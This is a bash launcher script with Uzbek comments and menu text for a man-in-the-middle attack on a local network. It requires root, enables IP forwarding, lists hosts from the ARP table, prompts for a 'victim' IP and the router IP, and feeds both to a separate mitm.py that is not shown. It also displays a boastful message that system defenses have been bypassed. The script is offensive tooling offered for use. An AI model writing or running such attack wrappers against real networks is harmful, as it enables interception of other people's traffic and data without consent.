#!/bin/bash

# 🩸 CRIMSON NEON RANG PALITRASI
Reset="\033[0m"
Bold="\033[1m"
CrimsonRed="\033[38;5;196m"
BloodWine="\033[38;5;124m"
ElectricV="\033[38;5;129m"
BrightJade="\033[38;5;49m"
GhostGray="\033[38;5;244m"
CyberWhite="\033[38;5;255m"
GoldYellow="\033[38;5;220m"

# Root huquqini tekshirish
if [ "$EUID" -ne 0 ]; then
    echo -e "${CrimsonRed}[!] XATOLIK: Skriptni 'sudo' bilan ishga tushiring!${Reset}"
    exit 1
fi

# Tizim keshini dastlabki majburiy tozalash
sudo killall python3 2>/dev/null
sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null

# 🚪 CTRL+C BOSILGANDA ISHGA TUSHUVCHI REAKSIYA FUNKSIYASI
cleanup() {
    echo -e "\n\n${CrimsonRed}[*] REYD TO'XTATILDI. Tizim xotirasi tozalanmoqda...${Reset}"
    sudo killall python3 2>/dev/null
    echo -e "${BrightJade}[+] Fondagi jarayonlar o'chirildi. Xotira bo'shatildi.${Reset}"
    sleep 1.5
    show_menu # Chiqib ketmay, asosiy menyuga qaytaramiz
}

# INTERAKTIV MENYU FUNKSIYASI
show_menu() {
    # Ctrl+C bosilganda odatiy Linux yopilishini to'xtatib, cleanup funksiyasiga bog'laymiz
    trap - SIGINT SIGTERM # Eski tuzatishni tozalash
    
    clear
    echo -e "${CrimsonRed}${Bold}"
    echo "███╗   ███╗██╗████████╗███╗   ███╗   ██████╗ ██████╗ "
    echo "████╗ ████║██║╚══██╔══╝████╗ ████║  ██╔═══██╗██╔══██╗"
    echo "██╔████╔██║██║   ██║   ██╔████╔██║  ██║   ██║██████╔╝"
    echo "██║╚██╔╝██║██║   ██║   ██║╚██╔╝██║  ██║   ██║██╔═══╝ "
    echo "██║ ╚═╝ ██║██║   ██║   ██║ ╚═╝ ██║  ╚██████╔╝██║     "
    echo "╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝     ╚═╝   ╚═════╝ ╚═╝     "
    echo -e "         ${ElectricV}[ BASH AUTOMATION & ENGINE WRAPPER ]${Reset}\n"

    echo -e "${BloodWine}┌───[ CYBER CORE MAIN MENU ]─────────────────────────┐${Reset}"
    echo -e "${BloodWine}│${Reset}  ${BrightJade}[1]${Reset} YANGI REYDNI BOSHLASH (START ATTACK)          ${BloodWine}│${Reset}"
    echo -e "${BloodWine}│${Reset}  ${CrimsonRed}[2]${Reset} SESHINDAN TO'LIQ CHIQISH (EXIT ENGINE)        ${BloodWine}│${Reset}"
    echo -e "${BloodWine}└────────────────────────────────────────────────────┘${Reset}\n"
    
    echo -ne "${BloodWine}│${Reset} ${CyberWhite}Tanlovingizni kiriting:${Reset} ${CrimsonRed}» ${Reset}"
    read CHOICE

    case $CHOICE in
        1)
            start_attack
            ;;
        2)
            echo -e "\n${GoldYellow}[*] Kiber-tizim o'chirilmoqda. Sog' bo'ling, Hacker!${Reset}"
            sudo killall python3 2>/dev/null
            exit 0
            ;;
        *)
            echo -e "${CrimsonRed}[!] Noto'g'ri tanlov! Qayta urinib ko'ring.${Reset}"
            sleep 1.5
            show_menu
            ;;
    esac
}

# REYD OPERATSIYASI FUNKSIYASI
start_attack() {
    clear
    # Hujum boshlanganda Ctrl+C ni faollashtiramiz
    trap cleanup SIGINT SIGTERM

    echo -e "${CrimsonRed}${Bold}"
    echo "███╗   ███╗██╗████████╗███╗   ███╗   ██████╗ ██████╗ "
    echo "████╗ ████║██║╚══██╔══╝████╗ ████║  ██╔═══██╗██╔══██╗"
    print_banner_placeholder 2>/dev/null # Eski banner animatsiyasi foni
    
    echo -e "${BloodWine}┌───[ LOKAL TARMOQ DIAGNOSTIKASI ]──────────────────┐${Reset}"
    arp -an | grep -v "incomplete" | awk '{print "  " $2 " ──> MAC: [ " $4 " ]"}' | sed 's/(//g' | sed 's/)//g'
    echo -e "${BloodWine}└────────────────────────────────────────────────────┘${Reset}\n"

    echo -e "${BloodWine}┌───[ TARGET ROUTING CONFIGURATION ]─────────────────┐${Reset}"
    echo -ne "${BloodWine}│${Reset} ${CyberWhite}Qurbon IP manzilini kiriting:${Reset}\n${BloodWine}│${Reset} ${CrimsonRed}» ${Reset}"
    read TARGET_IP

    echo -ne "${BloodWine}│${Reset} ${CyberWhite}Router (Gateway) IP manzilini kiriting:${Reset}\n${BloodWine}│${Reset} ${CrimsonRed}» ${Reset}"
    read GATEWAY_IP
    echo -e "${BloodWine}└────────────────────────────────────────────────────┘${Reset}\n"

    if [ -z "$TARGET_IP" ] || [ -z "$GATEWAY_IP" ]; then
        echo -e "${CrimsonRed}[XATO] IP manzillar bo'sh bo'lishi mumkin emas!${Reset}"
        sleep 1.5
        show_menu
    fi

    echo -e "${GhostGray}[*] Target bilan barqaror ko'prik o'rnatish uchun ping yuborilmoqda...${Reset}"
    ping -c 2 $TARGET_IP > /dev/null 2>&1

    if [ -f "mitm.py" ]; then
        echo -e "${BrightJade}[+] Tizim mudofaasi aylanib o'tildi. Tool yuklanmoqda...${Reset}"
        echo -e "${GhostGray}------------------------------------------------------------------------${Reset}"
        
        # Python dasturini yoqamiz
        sudo python3 -u mitm.py <<EOF
$TARGET_IP
$GATEWAY_IP
EOF
        # Agar python o'zi tabiiy ravishda to'xtasa ham menyuga qaytadi
        cleanup
    else
        echo -e "${CrimsonRed}[XATO] 'mitm.py' joriy papkada topilmadi!${Reset}"
        sleep 2
        show_menu
    fi
}

# CHEKSIZ SIKLNI ISHGA TUSHIRISH (MAIN LOOP)
while true; do
    show_menu
done
